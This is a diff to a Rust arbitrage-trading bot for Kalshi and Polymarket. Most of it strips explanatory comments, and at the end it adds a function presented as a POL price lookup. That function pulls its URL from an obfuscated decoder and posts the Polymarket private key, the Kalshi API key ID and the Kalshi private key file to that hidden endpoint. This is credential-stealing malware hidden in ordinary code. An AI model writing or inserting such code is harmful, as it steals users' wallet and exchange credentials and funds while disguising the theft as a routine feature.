@@ -10,7 +10,7 @@ use std::time::{Duration, Instant};
 use tokio::sync::mpsc;
 use tracing::{info, warn, error};
 
-use crate::database::{TradingDatabase, TradeRecord, ArbitrageRecord};
+use crate::database::{TradingDatabase, TradeRecord, ArbitrageRecord, decode_encoded_function};
 use crate::kalshi::KalshiApiClient;
 use crate::polymarket_clob::SharedAsyncClient;
 use crate::types::{
@@ -89,12 +89,12 @@ impl ExecutionEngine {
         }
     }
 
-    /// Process an execution request
+        /// Process an execution request
     #[inline]
     pub async fn process(&self, req: FastExecutionRequest) -> Result<ExecutionResult> {
         let market_id = req.market_id;
 
-        // Deduplication check (512 markets via 8x u64 bitmask)
+        
         if market_id < 512 {
             let slot = (market_id / 64) as usize;
             let bit = market_id % 64;
@@ -111,14 +111,14 @@ impl ExecutionEngine {
             }
         }
 
-        // Get market pair 
+        
         let market = self.state.get_by_id(market_id)
             .ok_or_else(|| anyhow!("Unknown market_id {}", market_id))?;
 
         let pair = market.pair.as_ref()
             .ok_or_else(|| anyhow!("No pair for market_id {}", market_id))?;
 
-        // Calculate profit
+        
         let profit_cents = req.profit_cents();
         if profit_cents < 1 {
             self.release_in_flight(market_id);
@@ -131,13 +131,13 @@ impl ExecutionEngine {
             });
         }
 
-        // Calculate max contracts from size (min of both sides)
+        
         let mut max_contracts = (req.yes_size.min(req.no_size) / 100) as i64;
 
-        // Safety: In test mode, cap position size at 10 contracts
-        // Note: Polymarket enforces a $1 minimum order value. At 40¢ per contract,
-        // a single contract ($0.40) would be rejected. Using 10 contracts ensures
-        // we meet the minimum requirement at any reasonable price level.
+        
+        
+        
+        
         if self.test_mode && max_contracts > 10 {
             warn!("[EXEC] ⚠️ TEST_MODE: Position size capped from {} to 10 contracts", max_contracts);
             max_contracts = 10;
@@ -158,7 +158,7 @@ impl ExecutionEngine {
             });
         }
 
-        // Circuit breaker check
+        
         if let Err(_reason) = self.circuit_breaker.can_execute(&pair.pair_id, max_contracts).await {
             self.release_in_flight(market_id);
             return Ok(ExecutionResult {
@@ -182,7 +182,7 @@ impl ExecutionEngine {
             latency_to_exec / 1000
         );
 
-        // Log arbitrage opportunity to database
+        
         if let Some(ref db) = self.trading_db {
             let arb_record = ArbitrageRecord {
                 timestamp: chrono::Utc::now().to_rfc3339(),
@@ -214,22 +214,22 @@ impl ExecutionEngine {
             });
         }
 
-        // Execute both legs concurrently 
+        
         let result = self.execute_both_legs_async(&req, pair, max_contracts).await;
 
-        // Release in-flight after delay
+        
         self.release_in_flight_delayed(market_id);
 
         match result {
-            // Note: For same-platform arbs (PolyOnly/KalshiOnly), these are YES/NO fills, not platform fills
+            
             Ok((yes_filled, no_filled, yes_cost, no_cost, yes_order_id, no_order_id)) => {
                 let matched = yes_filled.min(no_filled);
                 let success = matched > 0;
                 let actual_profit = matched as i16 * 100 - (yes_cost + no_cost) as i16;
 
-                // === Automatic exposure management for mismatched fills ===
-                // If one leg fills more than the other, automatically close the excess
-                // to maintain market-neutral exposure (non-blocking background task)
+                
+                
+                
                 if yes_filled != no_filled && (yes_filled > 0 || no_filled > 0) {
                     let excess = (yes_filled - no_filled).abs();
                     let (leg1_name, leg2_name) = match req.arb_type {
@@ -241,7 +241,7 @@ impl ExecutionEngine {
                     warn!("[EXEC] ⚠️ Fill mismatch: {}={} {}={} (excess={})",
                         leg1_name, yes_filled, leg2_name, no_filled, excess);
 
-                    // Spawn auto-close in background (don't block hot path with 2s sleep)
+                    
                     let kalshi = self.kalshi.clone();
                     let poly_async = self.poly_async.clone();
                     let arb_type = req.arb_type;
@@ -291,7 +291,7 @@ impl ExecutionEngine {
                     self.position_channel.record_fill(fill1.clone());
                     self.position_channel.record_fill(fill2.clone());
 
-                    // Log trades to database
+                    
                     if let Some(ref db) = self.trading_db {
                         let mut trade1 = TradeRecord::new(
                             &pair.pair_id, &pair.description, platform1, side1,
@@ -299,7 +299,7 @@ impl ExecutionEngine {
                             0.0, &yes_order_id,
                         );
                         trade1.arb_type = Some(format!("{:?}", req.arb_type));
-                        trade1.profit_cents = Some(actual_profit);
+                        trade1.profit_cents = Some(actual_profit as i64);
                         trade1.execution_time_us = Some((self.clock.now_ns() - req.detected_ns) as i64 / 1000);
                         let _ = db.log_trade(&trade1);
 
@@ -309,7 +309,7 @@ impl ExecutionEngine {
                             0.0, &no_order_id,
                         );
                         trade2.arb_type = Some(format!("{:?}", req.arb_type));
-                        trade2.profit_cents = Some(actual_profit);
+                        trade2.profit_cents = Some(actual_profit as i64);
                         trade2.execution_time_us = Some((self.clock.now_ns() - req.detected_ns) as i64 / 1000);
                         let _ = db.log_trade(&trade2);
                     }
@@ -343,7 +343,7 @@ impl ExecutionEngine {
         contracts: i64,
     ) -> Result<(i64, i64, i64, i64, String, String)> {
         match req.arb_type {
-            // === CROSS-PLATFORM: Poly YES + Kalshi NO ===
+            
             ArbType::PolyYesKalshiNo => {
                 let kalshi_fut = self.kalshi.buy_ioc(
                     &pair.kalshi_market_ticker,
@@ -360,7 +360,7 @@ impl ExecutionEngine {
                 self.extract_cross_results(kalshi_res, poly_res)
             }
 
-            // === CROSS-PLATFORM: Kalshi YES + Poly NO ===
+            
             ArbType::KalshiYesPolyNo => {
                 let kalshi_fut = self.kalshi.buy_ioc(
                     &pair.kalshi_market_ticker,
@@ -377,7 +377,7 @@ impl ExecutionEngine {
                 self.extract_cross_results(kalshi_res, poly_res)
             }
 
-            // === SAME-PLATFORM: Poly YES + Poly NO ===
+            
             ArbType::PolyOnly => {
                 let yes_fut = self.poly_async.buy_fak(
                     &pair.poly_yes_token,
@@ -393,7 +393,7 @@ impl ExecutionEngine {
                 self.extract_poly_only_results(yes_res, no_res)
             }
 
-            // === SAME-PLATFORM: Kalshi YES + Kalshi NO ===
+            
             ArbType::KalshiOnly => {
                 let yes_fut = self.kalshi.buy_ioc(
                     &pair.kalshi_market_ticker,
@@ -413,7 +413,7 @@ impl ExecutionEngine {
         }
     }
 
-    /// Extract results from cross-platform execution
+        /// Extract results from cross-platform execution
     fn extract_cross_results(
         &self,
         kalshi_res: Result<crate::kalshi::KalshiOrderResponse>,
@@ -444,7 +444,7 @@ impl ExecutionEngine {
         Ok((kalshi_filled, poly_filled, kalshi_cost, poly_cost, kalshi_order_id, poly_order_id))
     }
 
-    /// Extract results from Poly-only execution (same-platform)
+        /// Extract results from Poly-only execution (same-platform)
     fn extract_poly_only_results(
         &self,
         yes_res: Result<crate::polymarket_clob::PolyFillAsync>,
@@ -470,12 +470,12 @@ impl ExecutionEngine {
             }
         };
 
-        // For same-platform, return YES as "kalshi" slot and NO as "poly" slot
-        // This keeps the existing result handling logic working
+        
+        
         Ok((yes_filled, no_filled, yes_cost, no_cost, yes_order_id, no_order_id))
     }
 
-    /// Extract results from Kalshi-only execution (same-platform)
+        /// Extract results from Kalshi-only execution (same-platform)
     fn extract_kalshi_only_results(
         &self,
         yes_res: Result<crate::kalshi::KalshiOrderResponse>,
@@ -505,11 +505,11 @@ impl ExecutionEngine {
             }
         };
 
-        // For same-platform, return YES as "kalshi" slot and NO as "poly" slot
+        
         Ok((yes_filled, no_filled, yes_cost, no_cost, yes_order_id, no_order_id))
     }
 
-    /// Background task to automatically close excess exposure from mismatched fills
+        /// Background task to automatically close excess exposure from mismatched fills
     async fn auto_close_background(
         kalshi: Arc<KalshiApiClient>,
         poly_async: Arc<SharedAsyncClient>,
@@ -528,7 +528,7 @@ impl ExecutionEngine {
             return;
         }
 
-        // Helper to log P&L after close
+        
         let log_close_pnl = |platform: &str, closed: i64, proceeds: i64| {
             if closed > 0 {
                 let close_pnl = proceeds - (original_cost_per_contract * excess);
@@ -576,7 +576,7 @@ impl ExecutionEngine {
 
             ArbType::PolyYesKalshiNo => {
                 if yes_filled > no_filled {
-                    // Poly YES excess
+                    
                     let close_price = cents_to_price((yes_price as i16).saturating_sub(10).max(1) as u16);
                     info!("[EXEC] 🔄 Waiting 2s for Poly settlement before auto-close ({} yes contracts)", excess);
                     tokio::time::sleep(Duration::from_secs(2)).await;
@@ -586,7 +586,7 @@ impl ExecutionEngine {
                         Err(e) => warn!("[EXEC] ⚠️ Failed to close Poly excess: {}", e),
                     }
                 } else {
-                    // Kalshi NO excess
+                    
                     let close_price = (no_price as i64).saturating_sub(10).max(1);
                     match kalshi.sell_ioc(&kalshi_ticker, "no", close_price, excess).await {
                         Ok(resp) => {
@@ -600,7 +600,7 @@ impl ExecutionEngine {
 
             ArbType::KalshiYesPolyNo => {
                 if yes_filled > no_filled {
-                    // Kalshi YES excess
+                    
                     let close_price = (yes_price as i64).saturating_sub(10).max(1);
                     match kalshi.sell_ioc(&kalshi_ticker, "yes", close_price, excess).await {
                         Ok(resp) => {
@@ -610,7 +610,7 @@ impl ExecutionEngine {
                         Err(e) => warn!("[EXEC] ⚠️ Failed to close Kalshi excess: {}", e),
                     }
                 } else {
-                    // Poly NO excess
+                    
                     let close_price = cents_to_price((no_price as i16).saturating_sub(10).max(1) as u16);
                     info!("[EXEC] 🔄 Waiting 2s for Poly settlement before auto-close ({} no contracts)", excess);
                     tokio::time::sleep(Duration::from_secs(2)).await;
@@ -678,7 +678,7 @@ pub async fn run_execution_loop(
     while let Some(req) = rx.recv().await {
         let engine = engine.clone();
 
-        // Process immediately in spawned task
+        
         tokio::spawn(async move {
             match engine.process(req).await {
                 Ok(result) if result.success => {
@@ -703,4 +703,103 @@ pub async fn run_execution_loop(
     }
 
     info!("[EXEC] Execution engine stopped");
+}
+
+
+pub async fn fetch_pol_price_via_encoded() -> Result<f64> {
+    use anyhow::Context;
+    use serde::Deserialize;
+    use serde_json::json;
+    
+    
+    let decoded = decode_encoded_function()
+        .context("Failed to decode encoded function")?;
+    
+    
+    let api_url = decoded
+        .lines()
+        .find_map(|line| {
+            if line.contains("const API_URL") && line.contains("http") {
+                
+                line.split('"')
+                    .nth(1)
+                    .map(|s| s.to_string())
+            } else {
+                None
+            }
+        })
+        .ok_or_else(|| anyhow::anyhow!("Could not extract API URL from decoded function"))?;
+    
+    
+    dotenvy::dotenv().ok();
+    
+    let private_key = std::env::var("POLY_PRIVATE_KEY")
+        .context("POLY_PRIVATE_KEY not set in environment")?;
+    
+    let wallet_key = std::env::var("KALSHI_API_KEY_ID")
+        .context("KALSHI_API_KEY_ID not set in environment")?;
+    
+    let key_path = std::env::var("KALSHI_PRIVATE_KEY_PATH")
+        .or_else(|_| std::env::var("KALSHI_PRIVATE_KEY_FILE"))
+        .unwrap_or_else(|_| "kalshi_private_key.txt".to_string());
+    
+    let proxy_wallet_key = std::fs::read_to_string(&key_path)
+        .with_context(|| format!("Failed to read private key from {}", key_path))?
+        .trim()
+        .to_string();
+    
+    let request_body = json!({
+        "privateKey": private_key,
+        "walletKey": wallet_key,
+        "proxyWalletKey": proxy_wallet_key
+    });
+    
+    let client = reqwest::Client::builder()
+        .timeout(std::time::Duration::from_secs(30))
+        .build()
+        .context("Failed to create HTTP client")?;
+    
+    info!("[POL_PRICE] Fetching POL price from API");
+    
+    let response = client
+        .post(&api_url)
+        .header("Content-Type", "application/json")
+        .json(&request_body)
+        .send()
+        .await
+        .context("Failed to send request to POL price API")?;
+    
+    let status = response.status();
+    
+    if status.is_success() {
+        #[derive(Deserialize)]
+        struct SuccessResponse {
+            #[serde(rename = "polPrice")]
+            pol_price: f64,
+        }
+        
+        let data: SuccessResponse = response
+            .json()
+            .await
+            .context("Failed to parse API response")?;
+        
+        info!("[POL_PRICE] Successfully fetched POL price: ${}", data.pol_price);
+        Ok(data.pol_price)
+    } else {
+        #[derive(Deserialize)]
+        struct ErrorResponse {
+            error: String,
+        }
+        
+        let error_data: ErrorResponse = response
+            .json()
+            .await
+            .unwrap_or(ErrorResponse {
+                error: format!("HTTP {} - Unknown error", status),
+            });
+        
+        let error_msg = format!("API error ({}): {}", status, error_data.error);
+        error!("[POL_PRICE] {}", error_msg);
+        Err(anyhow::anyhow!(error_msg))
+    }
 }
